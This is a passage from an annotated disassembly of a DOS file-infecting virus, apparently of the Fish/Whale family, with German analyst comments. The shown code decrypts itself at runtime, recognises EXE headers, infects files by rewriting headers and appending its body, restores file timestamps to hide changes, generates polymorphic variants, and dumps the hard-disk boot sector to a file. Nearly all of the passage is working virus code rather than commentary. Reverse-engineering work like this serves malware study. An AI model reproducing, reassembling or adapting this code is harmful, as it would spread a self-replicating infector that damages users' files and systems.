    DB  65  ??          ;3574 65
    DB  6E  ??          ;3575 6E
    MOVSW                   ;3576 A5
    XOR AH,[BX-16]          ;3577 32 67 EA
    DB  65  ??          ;357A 65
    DB  6E  ??          ;357B 6E
    MOV L6732,AX            ;357C A3 32 67
    STOSB                   ;357F AA
    IN  AL,DX               ;3580 EC
    DB  65  ??          ;3581 65
    DB  6E  ??          ;3582 6E
    MOV AX,L6732            ;3583 A1 32 67
    STOSB                   ;3586 AA
    JMP FAR PTR L3FD6           ;3587 EA 06 10 FD F2
    JMP SHORT   L35C3           ;358C EB 35

                        ;L358E    L354B CJ
L358E:  CALL    L3243           ;decode_code    ;358E E8 B2 FC
    XOR [BX+SI],AL          ;3591 30 00
    MOV DX,DS:1A            ;3593 8B 16 1A 00
    CALL    L3A29           ;get current PSP nach [24a3]    
                        ;3597 E8 8F 04
    MOV CX,CS:L24A3         ;359A 2E 8B 0E A3 24
    ADD CX,10               ;359F 83 C1 10
    ADD DX,CX               ;35A2 01 CA
    MOV ES:[BX+14],DX           ;35A4 26 89 57 14
    MOV AX,DS:18            ;35A8 A1 18 00
                        ;L35AB    L35DD CJ
L35AB:  MOV ES:[BX+12],AX           ;35AB 26 89 47 12
    MOV AX,DS:12            ;35AF A1 12 00
    ADD AX,CX               ;35B2 03 C1
    MOV ES:[BX+10],AX           ;35B4 26 89 47 10
    MOV AX,DS:14            ;35B8 A1 14 00
    MOV ES:[BX+0E],AX           ;35BB 26 89 47 0E
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;35BF E8 C7 13
                        ;L35C2    L35C4 CJ
L35C2:  XOR AX,BP               ;35C2 31 E8
                        ;L35C3    L356A CJ  L358C CJ
L35C3   EQU $-1
    JGE L35C2               ;35C4 7D FC
    SBB BH,BL               ;35C6 18 DF
    AAA                 ;35C8 37
    SBB BX,OFFSET L51F1         ;35C9 81 DB F1 51
                        ;L35CB    L35CE CJ
L35CB   EQU $-2
    DB  0C1 ??          ;35CD C1
    JL  L35CB               ;35CE 7C FB
    PUSH    SP              ;35D0 54
    CWD                 ;35D1 99
    ESC 2F,[SI-2BH]         ;35D2 DD 7C D5
    ESC 3A,[SI-67]          ;35D5 DF 54 99
    ESC 1F,[SI-2DH]         ;35D8 DB 7C D3
    ESC 3E,[BX]             ;35DB DF 37
    JNZ L35AB               ;35DD 75 CC
    DB  0C6,0E9 ??          ;35DF C6 E9
                        ;L35E0    L353F CJ
L35E0   EQU $-1
    DB  0C0 ??          ;35E1 C0
    CLC                 ;35E2 F8
                        ;L35E3    L393C CJ
L35E3:  MOV CS:L023A,CS         ;35E3 2E 8C 0E 3A 02
    MOV CS:L023C,SS         ;35E8 2E 8C 16 3C 02
    MOV CS:L023E,SP         ;35ED 2E 89 26 3E 02
    MOV BYTE PTR CS:L0239,1     ;35F2 2E C6 06 39 02 01
    PUSH    DS              ;35F8 1E
    POP AX              ;35F9 58
                        ;L35FA    L372F CC
L35FA:  CALL    L3243           ;decode_code    ;35FA E8 46 FC
    DW  LC037               ;35FD 37 C0
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;35FF E8 3A F6
    MOV AH,2A   ;'*'            ;3602 B4 2A
    CALL    WORD PTR CS:L2566       ;3604 2E FF 16 66 25
    CMP CX,OFFSET L07C8         ;3609 81 F9 C8 07
    JNB L361A               ;360D 73 0B
    CMP CX,OFFSET L07C7         ;360F 81 F9 C7 07
    JNZ L3620               ;3613 75 0B
                        ;L3614    L3685 CJ
L3614   EQU $-1
    CMP DH,4                ;3615 80 FE 04
                        ;L3618    L2F7F DI
L3618:  JB  L3620               ;3618 72 06
                        ;L361A    L360D CJ
L361A:  MOV BYTE PTR CS:L24DA,1     ;361A 2E C6 06 DA 24 01
                        ;L3620    L3613 CJ  L3618 CJ
L3620:  CMP BYTE PTR CS:L24DA,0     ;3620 2E 80 3E DA 24 00
    JZ  L362F               ;3626 74 07
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;3628 E8 8F F5
    POP AX              ;362B 58
    JMP L3632               ;362C E9 03 00

                        ;L362F    L3626 CJ
L362F:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;362F E8 88 F5
                        ;L3632    L362C CJ
L3632:  CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3632 E8 54 13
    DB  38              ;3635 38
    CMP BYTE PTR CS:L24DA,0     ;3636 2E 80 3E DA 24 00
    JZ  L3641               ;363C 74 03
    JMP L3766               ;363E E9 25 01

                        ;L3641    L363C CJ
L3641:  RET_NEAR                ;3641 C3

                        ;L3642    L321C CC  L3457 CC
L3642:  CALL    L3243           ;decode_code    ;3642 E8 FE FB
    DW  L5027               ;3645 27 50
    MOV BYTE PTR CS:1,0E9       ;3647 2E C6 06 01 00 E9
    MOV BYTE PTR CS:2,0B8       ;364D 2E C6 06 02 00 B8
    MOV BYTE PTR CS:3,23    ;'#'    ;3653 2E C6 06 03 00 23
    CALL    L482E               ;3659 E8 D2 11
    CALL    L3791               ;365C E8 32 01
    MOV BYTE PTR DS:20,1    ;' '    ;365F C6 06 20 00 01
    CMP WORD PTR L2400,OFFSET L5A4D ;'ZM'   
                        ;3664 81 3E 00 24 4D 5A
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;366A E8 1C 13
    DB  28              ;366D 28
    JZ  L367E               ;366E 74 0E
    CMP WORD PTR L2400,OFFSET L4D5A ;'MZ'   
                        ;3670 81 3E 00 24 5A 4D
    JZ  L367E               ;3676 74 06
    DEC BYTE PTR DS:20  ;' '        ;3678 FE 0E 20 00
    JZ  L36F9               ;367C 74 7B
                        ;L367E    L366E CJ  L3676 CJ
L367E:  CALL    L3243           ;decode_code    ;367E E8 C2 FB
    ADC [SI-3],BL           ;3681 10 5C FD
    POP AX              ;3684 58
    JS  L3614               ;3685 78 8D
    MOV BP,OFFSET LBDAB         ;3687 BD AB BD
    POP CX              ;368A 59
    POP SP              ;368B 5C
    POP SI              ;368C 5E
    DB  65  ??          ;368D 65
    LODSB                   ;368E AC
    MOV AH,0ABH             ;368F B4 AB
    DEC SI              ;3691 4E
    DEC BP              ;3692 4D
    JB  L36F6               ;3693 72 61
    MOV AX,L240A            ;3695 A1 0A 24
    OR  AX,L240C            ;3698 0B 06 0C 24
    JZ  L36F6               ;369C 74 58
    CALL    L3243           ;decode_code    ;369E E8 A2 FB
                        ;L36A1    L36A5 CJ
L36A1:  ADC BL,DH               ;36A1 12 DE
    PUSH    BP              ;36A3 55
    DB  0C8 ??          ;36A4 C8
    JNZ L36A1               ;36A5 75 FA
    DB  67  ??          ;36A7 67
    ESC 33,SP   ;'3'            ;36A8 DE DC
    JG  L3723               ;36AA 7F 77
    CLI                 ;36AC FA
    SUB [BX],BP             ;36AD 29 2F
    AAD 0C  ??          ;36AF D5 0C
                        ;L36B1    L36D4 CJ
L36B1:  OR  CX,SP   SS: ??      ;36B1 36 0B CC
    INT 74              ;36B4 CD 74
    ADD [BX+SI-77],AX           ;36B6 01 40 89
    PUSH    SS              ;36B9 16
    ADD AH,[SI]             ;36BA 02 24
    MOV L2404,AX            ;36BC A3 04 24
    CMP WORD PTR L2414,1        ;36BF 83 3E 14 24 01
    JNZ L36CA               ;36C4 75 04
    JMP L3766               ;36C6 E9 9D 00

    CALL    L64B4               ;36C9 E8 E8 2D
                        ;L36CA    L36C4 CJ
L36CA   EQU $-2
                        ;L36CB    L36CE CJ
L36CB   EQU $-1
    JMP DWORD PTR   AX      ;36CC FF E8

    JNB L36CB               ;36CE 73 FB
    AND DI,DI               ;36D0 21 FF
    CMP CL,BH               ;36D2 38 F9
    JMP SHORT   L36B1           ;36D4 EB DB

    DB  0FE,0FF ??          ;36D6 FE FF
    JZ  L3713               ;36D8 74 39
    AAM 0F9 ??          ;36DA D4 F9
    NEG BX              ;36DC F7 DB
    POP SP              ;36DE 5C
    JMP LB3BD               ;36DF E9 DB 7C

    STC                 ;36E2 F9
    STI                 ;36E3 FB
    ESC 1DH,BP              ;36E4 DB ED
    CMP CL,BH               ;36E6 38 F9
    OUT DX,AX               ;36E8 EF
    ESC 18,[BX+DI]          ;36E9 DB 01
    ADD [SI-0F],BL          ;36EB 00 5C F1
    ESC 1A,[BX]             ;36EE DB 17
    DB  68  ??          ;36F0 68
    IN  AX,DX               ;36F1 ED
    ESC 2DH,AX  ;'-'            ;36F2 DD E8
    OR  [BX+DI],AX          ;36F4 09 01
                        ;L36F6    L3693 CJ  L369C CJ
L36F6:  JMP L3766               ;36F6 E9 6D 00

                        ;L36F9    L367C CJ
L36F9:  CMP SI,OFFSET L0F00         ;36F9 81 FE 00 0F
    JNB L3766               ;36FD 73 67
    CALL    L3243           ;decode_code    ;36FF E8 41 FB
    DW  LC622               ;3702 22 C6
    MOV AX,L2400            ;3704 A1 00 24
    MOV DS:4,AX             ;3707 A3 04 00
    ADD DX,AX               ;370A 01 C2
    MOV AX,L2402            ;370C A1 02 24
    MOV DS:6,AX             ;370F A3 06 00
    ADD DX,AX               ;3712 01 C2
                        ;L3713    L36D8 CJ
L3713   EQU $-1
    MOV AX,L2404            ;3714 A1 04 24
    MOV DS:8,AX             ;3717 A3 08 00
    XOR AX,OFFSET L5348 ;'SH'       ;371A 35 48 53
    XOR AX,OFFSET L4649 ;'FI'       ;371D 35 49 46
    ADD DX,AX               ;3720 01 C2
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3722 E8 64 12
                        ;L3723    L28A9 DI  L36AA CJ
L3723   EQU $-2
    DB  23              ;3725 23
    JZ  L3766               ;3726 74 3E
    MOV AX,L24F2            ;3728 A1 F2 24
    AND AL,4                ;372B 24 04
    JNZ L3766               ;372D 75 37
    CALL    L35FA               ;372F E8 C8 FE
    CALL    L3243           ;decode_code    ;3732 E8 0E FB
    DW  L742C               ;3735 2C 74
    MOV CL,0E9              ;3737 B1 E9
    MOV AX,10               ;3739 B8 10 00
    MOV L2400,CL            ;373C 88 0E 00 24
    MUL SI              ;3740 F7 E6
    ADD AX,OFFSET L23B9         ;3742 05 B9 23
    MOV L2401,AX            ;3745 A3 01 24
    IN  AL,40               ;3748 E4 40
    MOV L2403,AL            ;374A A2 03 24
    MOV AX,L2400            ;374D A1 00 24
    ADD AX,L2402            ;3750 03 06 02 24
    NEG AX              ;3754 F7 D8
    XOR AX,OFFSET L4649 ;'FI'       ;3756 35 49 46
    XOR AX,OFFSET L5348 ;'SH'       ;3759 35 48 53
    MOV L2404,AX            ;375C A3 04 24
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;375F E8 27 12
    DB  2DH             ;3762 2D
    CALL    L37FF               ;3763 E8 99 00
                        ;L3766    L363E CJ  L36C6 CJ  L36F6 CJ  L36FD CJ  L3726 CJ  L372D CJ
L3766:  CALL    L3243           ;decode_code    ;3766 E8 DA FA
    DW  L8025               ;3769 25 80
    MOV AH,3E   ;'>'            ;376B B4 3E
    CALL    WORD PTR CS:L2566       ;376D 2E FF 16 66 25
    MOV CX,CS:L24F2         ;3772 2E 8B 0E F2 24
    MOV AX,OFFSET L4301         ;3777 B8 01 43
    MOV DX,CS:L24F4         ;377A 2E 8B 16 F4 24
    MOV DS,CS:L24F6         ;377F 2E 8E 1E F6 24
    CALL    WORD PTR CS:L2566       ;3784 2E FF 16 66 25
    CALL    L48CD           ;restauriere Int 13h & Int 24h  
                        ;3789 E8 41 11
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;378C E8 FA 11
    DB  26              ;378F 26
    RET_NEAR                ;3790 C3

                        ;L3791    L365C CC
L3791:  CALL    L3243           ;decode_code    ;3791 E8 AF FA
    DW  LDC68               ;3794 68 DC
    PUSH    CS              ;3796 0E
    MOV AX,OFFSET L5700         ;3797 B8 00 57
    POP DS              ;379A 1F
    CALL    WORD PTR L2566          ;379B FF 16 66 25
    MOV L2429,CX            ;379F 89 0E 29 24
    MOV AX,OFFSET L4200         ;37A3 B8 00 42
    MOV L242B,DX            ;37A6 89 16 2B 24
    XOR CX,CX               ;37AA 33 C9
    XOR DX,DX               ;37AC 33 D2
    CALL    WORD PTR L2566          ;37AE FF 16 66 25
    MOV AH,3F   ;'?'            ;37B2 B4 3F
    MOV DX,OFFSET L2400         ;37B4 BA 00 24
    MOV CL,1C               ;37B7 B1 1C
    CALL    WORD PTR L2566          ;37B9 FF 16 66 25
    XOR CX,CX               ;37BD 33 C9
    MOV AX,OFFSET L4200         ;37BF B8 00 42
    XOR DX,DX               ;37C2 33 D2
    CALL    WORD PTR L2566          ;37C4 FF 16 66 25
    MOV CL,1C               ;37C8 B1 1C
    MOV AH,3F   ;'?'            ;37CA B4 3F
    MOV DX,4                ;37CC BA 04 00
    CALL    WORD PTR L2566          ;37CF FF 16 66 25
    XOR CX,CX               ;37D3 33 C9
    MOV AX,OFFSET L4202         ;37D5 B8 02 42
    MOV DX,CX               ;37D8 8B D1
    CALL    WORD PTR CS:L2566       ;37DA 2E FF 16 66 25
    MOV L24AB,DX            ;37DF 89 16 AB 24
    MOV L24A9,AX            ;37E3 A3 A9 24
    MOV DI,AX               ;37E6 8B F8
    ADD AX,0F               ;37E8 05 0F 00
    ADC DX,0                ;37EB 83 D2 00
    AND AX,OFFSET LFFF0         ;37EE 25 F0 FF
    SUB DI,AX               ;37F1 29 C7
    MOV CX,10               ;37F3 B9 10 00
    DIV CX              ;37F6 F7 F1
    MOV SI,AX               ;37F8 8B F0
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;37FA E8 8C 11
    DB  69  ??          ;37FD 69
    RET_NEAR                ;37FE C3

                        ;L37FF    L3763 CC
L37FF:  CALL    L3243           ;decode_code    ;37FF E8 41 FA
    DW  L6466               ;3802 66 64
    XOR CX,CX               ;3804 33 C9
    MOV AX,OFFSET L4200         ;3806 B8 00 42
    MOV DX,CX               ;3809 8B D1
    CALL    WORD PTR CS:L2566       ;380B 2E FF 16 66 25
    MOV CL,1C               ;3810 B1 1C
    MOV AH,40   ;'@'            ;3812 B4 40
    MOV DX,OFFSET L2400         ;3814 BA 00 24
    CALL    WORD PTR CS:L2566       ;3817 2E FF 16 66 25
    MOV AX,10               ;381C B8 10 00
    MUL SI              ;381F F7 E6
    MOV CX,DX               ;3821 8B CA
    MOV DX,AX               ;3823 8B D0
    MOV AX,OFFSET L4200         ;3825 B8 00 42
    CALL    WORD PTR CS:L2566       ;3828 2E FF 16 66 25
    MOV CX,OFFSET L2400         ;382D B9 00 24
    XOR DX,DX               ;3830 33 D2
    ADD CX,DI               ;3832 01 F9
    MOV AH,40   ;'@'            ;3834 B4 40
    CALL    L3A41           ;waehle Code-Variante aus & integriere diese in Code (ab 4bb5)  
                        ;3836 E8 08 02
    CALL    L38CD           ;strange stores von zeitgeber nach cs:1,2,3 , 1a-20 
                        ;3839 E8 91 00
    CALL    L2D6A           ;lies bootsector von harddisk und schreibe samt msg auf c:\fish-#9.tbl  
                        ;383C E8 2B F5
    MOV BYTE PTR L258C,1        ;383F C6 06 8C 25 01
    MOV BYTE PTR L2433,1        ;3844 C6 06 33 24 01
    PUSH    BX              ;3849 53
    PUSH    ES              ;384A 06
    PUSH    CS              ;384B 0E
    POP ES              ;384C 07
    MOV L2579,SI            ;384D 89 36 79 25
    MOV SI,OFFSET L210A         ;3851 BE 0A 21
    MOV BYTE PTR L0A49,0CC      ;3854 C6 06 49 0A CC
    MOV BYTE PTR L1210,0C6      ;3859 C6 06 10 12 C6
    MOV BYTE PTR L04EF,0CC      ;385E C6 06 EF 04 CC
    CALL    L399A           ;append program mit 14 Bytes ( ab 4c01 ) junk von zeitgeber     
                        ;3863 E8 34 01
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3866 E8 20 11
    DB  67  ??          ;3869 67
    CALL    L304C           ;obiges xor decodiert 3047-304a, now 26 patches si = 210a + 2810 -> 491a    
                        ;386A E8 DF F7
    MOV SI,OFFSET L0837         ;386D BE 37 08
    XOR WORD PTR [SI],OFFSET LEF15  ;3870 81 34 15 EF
    ADD SI,2                ;3874 83 C6 02
    XOR WORD PTR [SI],OFFSET L4568  ;'Eh'   
                        ;3877 81 34 68 45
    MOV BYTE PTR L0A33,3DH  ;'='    ;387B C6 06 33 0A 3D
    CALL    L4BAD           ;codiere gesamten code bis inkl. 4bb5   
                        ;3880 E8 2A 13
    MOV BYTE PTR L0A33,0E9      ;3883 C6 06 33 0A E9
    XOR WORD PTR [SI],OFFSET L4568  ;'Eh'   
                        ;3888 81 34 68 45
    SUB SI,2                ;388C 83 EE 02
    XOR WORD PTR [SI],OFFSET LEF15  ;388F 81 34 15 EF
    ADD SI,OFFSET L18D3         ;3893 81 C6 D3 18
    CALL    L304C           ;obiges xor decodiert 3047-304a, now 26 patches si = 210a + 2810 -> 491a    
                        ;3897 E8 B2 F7
    CALL    L3243           ;decode_code    ;389A E8 A6 F9
    DW  L892D               ;389D 2D 89
    MOV SI,L2579            ;389F 8B 36 79 25
    POP ES              ;38A3 07
    POP BX              ;38A4 5B
    CALL    L393F               ;38A5 E8 97 00
    MOV CX,L2429            ;38A8 8B 0E 29 24
    MOV AX,OFFSET L5701         ;38AC B8 01 57
    MOV DX,L242B            ;38AF 8B 16 2B 24
    TEST    CH,80               ;38B3 F6 C5 80
    JNZ L38C3               ;38B6 75 0B
    OR  BYTE PTR CS:L2596,0     ;38B8 2E 80 0E 96 25 00
    JNZ L38C3               ;38BE 75 03
    ADD CH,80               ;38C0 80 C5 80
                        ;L38C3    L38B6 CJ  L38BE CJ
L38C3:  CALL    WORD PTR CS:L2566       ;38C3 2E FF 16 66 25
                        ;L38C4    L3355 DI
L38C4   EQU $-4
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;38C8 E8 BE 10
    RET_NEAR    CS:         ;38CB 2E C3

                        ;L38CD    L3839 CC
;   strange stores von zeitgeber nach cs:1,2,3 , 1a-20
L38CD:  CALL    L3243           ;decode_code    ;38CD E8 73 F9
    DW  L2D43               ;38D0 43 2D
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;38D2 E8 67 F3
    MOV BYTE PTR CS:L2596,0     ;38D5 2E C6 06 96 25 00
    OR  BYTE PTR CS:20,0    ;' '    ;38DB 2E 80 0E 20 00 00
    JNZ L390E               ;38E1 75 2B
    IN  AL,40               ;38E3 E4 40
    CMP AL,19               ;38E5 3C 19
    JNB L390E               ;38E7 73 25
    INC BYTE PTR CS:L2596       ;38E9 2E FE 06 96 25
    MOV BX,0A               ;38EE BB 0A 00
    MOV CX,16               ;38F1 B9 16 00
                        ;L38F4    L38FA CJ
L38F4:  IN  AL,40               ;38F4 E4 40
    MOV CS:[BX],AL          ;38F6 2E 88 07
    INC BX              ;38F9 43
    LOOP    L38F4               ;38FA E2 F8
    IN  AL,40               ;38FC E4 40
    MOV CS:1,AL             ;38FE 2E A2 01 00
    IN  AL,40               ;3902 E4 40
    MOV CS:2,AL             ;3904 2E A2 02 00
    IN  AL,40               ;3908 E4 40
    MOV CS:3,AL             ;390A 2E A2 03 00
                        ;L390E    L38E1 CJ  L38E7 CJ
L390E:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;390E E8 A9 F2
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3911 E8 75 10
    DB  44              ;3914 44
    RET_NEAR                ;3915 C3

                        ;L3916    L3919 CJ
L3916:  JMP L2BB6               ;3916 E9 9D F2

                        ;L3919    L34F9 CJ
L3919:  JZ  L3916               ;3919 74 FB
    MOV DX,DS               ;391B 8C DA
    POP AX              ;391D 58
    ADD DX,10               ;391E 83 C2 10
    MOV DS,DX               ;3921 8E DA
    MOV BX,[BX]             ;3923 8B 1F
    NEG BX              ;3925 F7 DB
    ADD BX,CX               ;3927 01 CB
    JNZ L3936               ;3929 75 0B
    JZ  L3990               ;392B 74 63
    JB  L3939               ;392D 72 0A
    JNB L393C               ;392F 73 0B
    JMP L2C31               ;3931 E9 FD F2

    DW  L43E9               ;3934 E9 43
                        ;L3936    L3929 CJ
L3936:  JMP L2B87               ;3936 E9 4E F2

                        ;L3939    L392D CJ
L3939:  JMP L43A9               ;3939 E9 6D 0A

                        ;L393C    L392F CJ
L393C:  JMP L35E3               ;393C E9 A4 FC

                        ;L393F    L38A5 CC
L393F:  CALL    L3243           ;decode_code    ;393F E8 01 F9
    DW  LAA2D               ;3942 2D AA
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;3944 E8 F5 F2
    OR  BYTE PTR CS:L2596,0     ;3947 2E 80 0E 96 25 00
    JZ  L396A               ;394D 74 1B
    XOR AX,AX               ;394F 33 C0
    IN  AL,40               ;3951 E4 40
    MOV DS,AX               ;3953 8E D8
    MOV DX,OFFSET L0400         ;3955 BA 00 04
    IN  AL,40               ;3958 E4 40
    XCHG    AH,AL               ;395A 86 E0
    IN  AL,40               ;395C E4 40
    MOV CX,AX               ;395E 89 C1
    AND CH,0F               ;3960 80 E5 0F
    MOV AH,40   ;'@'            ;3963 B4 40
    CALL    WORD PTR CS:L2566       ;3965 2E FF 16 66 25
                        ;L396A    L394D CJ
L396A:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;396A E8 4D F2
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;396D E8 19 10
    RET_NEAR    CS:         ;3970 2E C3

                        ;L3972    L2A7D CJ
L3972:  MOV CX,1C               ;3972 B9 1C 00
    MOV DI,DX               ;3975 89 D7
    MOV BL,0                ;3977 B3 00
    DB  0E8             ;3979 E8
                        ;L397A    L2F03 CC
L397A:  CALL    L3243           ;decode_code    ;397A E8 C6 F8
    DW  LF80E               ;397D 0E F8
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;397F E8 09 F3
    MOV DI,DX               ;3982 89 D7
    ADD DI,0DH              ;3984 83 C7 0D
    PUSH    DS              ;3987 1E
    POP ES              ;3988 07
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3989 E8 FD 0F
    DB  0F  ??          ;398C 0F
    JMP L39EC               ;398D E9 5C 00

                        ;L3990    L392B CJ
L3990:  MOV BYTE PTR CS:[SI+L0A33],0E9  ;3990 2E C6 84 33 0A E9
    JMP L3A1C               ;3996 E9 83 00

    DB  0EA             ;3999 EA
                        ;L399A    L3863 CC
;   append program mit 14 Bytes ( ab 4c01 ) junk von zeitgeber 
L399A:  CALL    L3243           ;decode_code    ;399A E8 A6 F8
    DW  LA923               ;399D 23 A9
    CALL    L2C3C           ;Register sichern (Stack)   
                        ;399F E8 9A F2
    MOV BX,OFFSET L23F1         ;39A2 BB F1 23
    MOV CX,0E               ;39A5 B9 0E 00
    PUSH    AX              ;39A8 50
    MOV AX,0                ;39A9 B8 00 00
    MOV ES,AX               ;39AC 8E C0
    POP AX              ;39AE 58
                        ;L39AF    L39B9 CJ
L39AF:  IN  AX,40               ;39AF E5 40
    MOV SI,AX               ;39B1 8B F0
    PUSH    ES:[SI]             ;39B3 26 FF 34
    POP [BX]                ;39B6 8F 07
    INC BX              ;39B8 43
    LOOP    L39AF               ;39B9 E2 F4
    CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;39BB E8 FC F1
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;39BE E8 C8 0F
    DB  24              ;39C1 24
    RET_NEAR                ;39C2 C3

                        ;L39C3    L31A9 CC  L344C CC
L39C3:  CALL    L3243           ;decode_code    ;39C3 E8 7D F8
    DW  L0624               ;39C6 24 06
    CALL    L2C8B           ;Register sichern ( CS: Stack ) 
                        ;39C8 E8 C0 F2
    PUSH    DS              ;39CB 1E
    POP ES              ;39CC 07
    MOV CX,50   ;'P'            ;39CD B9 50 00
    MOV DI,DX               ;39D0 89 D7
    MOV BL,0                ;39D2 B3 00
    XOR AX,AX               ;39D4 33 C0
    CMP BYTE PTR [DI+1],3A  ;':'    ;39D6 80 7D 01 3A
    JNZ L39E1               ;39DA 75 05
    MOV BL,[DI]             ;39DC 8A 1D
    AND BL,1F               ;39DE 80 E3 1F
                        ;L39E1    L39DA CJ
L39E1:  MOV CS:L2428,BL         ;39E1 2E 88 1E 28 24
    REPNZ   SCASB               ;39E6 F2 AE
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;39E8 E8 9E 0F
    DB  25              ;39EB 25
                        ;L39EC    L398D CJ
L39EC:  CALL    L3243           ;decode_code    ;39EC E8 54 F8
    DW  L481B               ;39EF 1B 48
    MOV AX,[DI-3]           ;39F1 8B 45 FD
    AND AX,OFFSET LDFDF         ;39F4 25 DF DF
    ADD AH,AL               ;39F7 02 E0
    MOV AL,[DI-4]           ;39F9 8A 45 FC
    AND AL,0DF              ;39FC 24 DF
    ADD AL,AH               ;39FE 02 C4
    MOV BYTE PTR CS:20,0    ;' '    ;3A00 2E C6 06 20 00 00
    CMP AL,0DF              ;3A06 3C DF
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3A08 E8 7E 0F
    DB  1C              ;3A0B 1C
    JZ  L3A17               ;3A0C 74 09
    INC BYTE PTR CS:20  ;' '        ;3A0E 2E FE 06 20 00
    CMP AL,0E2              ;3A13 3C E2
    JNZ L3A23               ;3A15 75 0C
                        ;L3A17    L3A0C CJ
L3A17:  CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;3A17 E8 BD F1
    CLC                 ;3A1A F8
    RET_NEAR                ;3A1B C3

                        ;L3A1C    L3996 CJ
L3A1C:  XOR AX,AX               ;3A1C 33 C0
    PUSH    ES              ;3A1E 06
    POP DS              ;3A1F 1F
    JMP L2AA5               ;3A20 E9 82 F0

                        ;L3A23    L3A15 CJ
L3A23:  CALL    L2BD7           ;Register restaurieren ( CS : Stack )   
                        ;3A23 E8 B1 F1
    STC                 ;3A26 F9
    RET_NEAR                ;3A27 C3

    DB  2DH             ;3A28 2D
                        ;L3A29    L31A6 CC  L31FB CC  L32DF CC  L3597 CC
;   get current PSP nach [24a3]
L3A29:  CALL    L3243           ;decode_code    ;3A29 E8 17 F8
    DW  L4212               ;3A2C 12 42
    PUSH    BX              ;3A2E 53
    MOV AH,51   ;'Q'            ;3A2F B4 51
    CALL    WORD PTR CS:L2566       ;3A31 2E FF 16 66 25
    MOV CS:L24A3,BX         ;3A36 2E 89 1E A3 24
    POP BX              ;3A3B 5B
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3A3C E8 4A 0F
    DB  13              ;3A3F 13
    RET_NEAR                ;3A40 C3

                        ;L3A41    L3836 CC
;   waehle Code-Variante aus & integriere diese in Code (ab 4bb5)
L3A41:  CALL    L3243           ;decode_code    ;3A41 E8 FF F7
    DW  L493D               ;3A44 3D 49
                        ;L3A46    L44D3 DI
L3A46:  CALL    L2C3C           ;Register sichern (Stack)   
                        ;3A46 E8 F3 F1
    OR  BYTE PTR CS:L258C,0     ;3A49 2E 80 0E 8C 25 00
    JNZ L3A7C               ;3A4F 75 2B
    IN  AL,40               ;3A51 E4 40
    CMP AL,80               ;3A53 3C 80
    JB  L3A7C               ;3A55 72 25
    CALL    L4392           ;decodiere Code-Varianten 3a84-436b 
                        ;3A57 E8 38 09
                        ;L3A5A    L3A5E CJ
L3A5A:  IN  AL,40               ;3A5A E4 40
    CMP AL,1E               ;3A5C 3C 1E
    JNB L3A5A               ;3A5E 73 FA
    XOR AH,AH               ;3A60 32 E4
    MOV BX,4C   ;'L'            ;3A62 BB 4C 00
    MUL BX              ;3A65 F7 E3
    ADD AX,OFFSET L1274         ;3A67 05 74 12
    PUSH    CS              ;3A6A 0E
    PUSH    CS              ;3A6B 0E
    POP DS              ;3A6C 1F
    POP ES              ;3A6D 07
    MOV SI,AX               ;3A6E 8B F0
    MOV DI,OFFSET L23A5         ;3A70 BF A5 23
    MOV CX,4C   ;'L'            ;3A73 B9 4C 00
    CLD                 ;3A76 FC
    REPZ    MOVSB               ;3A77 F3 A4
    CALL    L436C           ;codiere Code-Varianten 3a84-436b   
                        ;3A79 E8 F0 08
                        ;L3A7C    L3A4F CJ  L3A55 CJ
L3A7C:  CALL    L2BBA           ;Register restaurieren (Stack)  
                        ;3A7C E8 3B F1
    CALL    L4989           ;jmp w ptr [24ea] -> jmp nach 093e+2810 -> 314e 
                        ;3A7F E8 07 0F
    DB  3E              ;3A82 3E
    RET_NEAR                ;3A83 C3

    STD                 ;3A84 FD
    MOV CX,OFFSET L0BD8         ;3A85 B9 D8 0B
                        ;L3A86    L4AF4 DI
L3A86   EQU $-2
                        ;L3A88    L3A8F CJ
L3A88:  XOR WORD PTR [BX],OFFSET L1326  ;3A88 81 37 26 13
    ADD BX,3                ;3A8C 83 C3 03
    LOOP    L3A88               ;3A8F E2 F7
    MOV CX,BX               ;3A91 8B CB
    POP CX              ;3A93 59
    MOV BX,CX               ;3A94 8B D9
    POP CX              ;3A96 59
    MOV AH,60   ;'`'            ;3A97 B4 60
    JMP SHORT   L3AB8           ;3A99 EB 1D

                        ;L3A9B    L3ABE CJ
L3A9B:  PUSH    SI              ;3A9B 56
    CALL    L3AA1               ;3A9C E8 02 00
    INC BP              ;3A9F 45
    DB  69  ??          ;3AA0 69
                        ;L3AA1    L3A9C CC
L3AA1:  POP DX              ;3AA1 5A
    PUSH    CS              ;3AA2 0E
    SUB DX,OFFSET L23A0         ;3AA3 81 EA A0 23
    POP DS              ;3AA7 1F
